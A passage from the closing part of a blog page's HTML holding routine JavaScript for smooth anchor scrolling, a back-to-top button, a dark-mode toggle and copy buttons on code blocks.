            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerText = 'copy';

        function copyingDone() {
            copybutton.innerText = 'copied!';
            setTimeout(() => {
                copybutton.innerText = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
